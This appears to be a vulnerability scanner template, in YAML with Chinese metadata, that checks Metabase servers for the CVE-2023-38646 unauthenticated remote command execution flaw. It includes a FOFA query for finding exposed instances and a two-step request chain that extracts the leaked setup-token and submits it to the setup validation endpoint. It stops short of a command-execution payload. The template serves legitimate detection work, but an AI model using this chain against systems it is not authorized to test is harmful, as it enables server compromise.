id: CVE-2023-38646

info:
  name: Metabase 远程命令执行漏洞 RCE
  author: xpoc
  severity: critical
  verified: true
  description: |
    Metabase 是开源的数据分析和可视化工具，支持多种数据源连接，包括数据库、云服务和API。未经身份认证的远程攻击者利用该漏洞可以在服务器上以运行 Metabase 服务器的权限执行任意命令。值得注意的是，修复后的版本也需要在完成安装后才可修复漏洞，否则依旧存在被攻击者利用的可能性。
    FOFA: app="Metabase"
  reference:
    - https://stack.chaitin.com/techblog/detail?id=140
    - https://mp.weixin.qq.com/s/IXogu26hFaQgCzLuPuzPKQ
  tags: cve,cve2023,metabase,rce
  created: 2023/07/27

rules:
  r0:
    request:
      method: GET
      path: /api/session/properties
    expression: response.body.bcontains(b"setup-token") && response.raw_header.ibcontains(b"metabase")
    output:
      search: |-
        "setup-token\":\"(?P<token>.*?)\"".bsubmatch(response.body)
      token: search["token"]
  r1:
    request:
      method: POST
      path: /api/setup/validate
      headers:
        Content-Type: application/json
      body: |-
        {"token":"{{token}}","details":{"is_on_demand":false,"is_full_sync":false,"is_sample":false,"cache_ttl":null,"refingerprint":true,"auto_run_queries":true,"schedules":{},"details":{},"name":"test","engine":"mysql"}}}
    expression: |
      response.raw_header.ibcontains(b"metabase") 
      && !response.body.bcontains(b"Instance already initialized")
      && (
        response.body.bcontains(b"Could not connect to address")
        || (
          response.body.bcontains(b'"message":')
          && response.body.bcontains(b'"errors":')
          && response.body.bcontains(b'"host":')
        )
      )
expression: r0() && r1()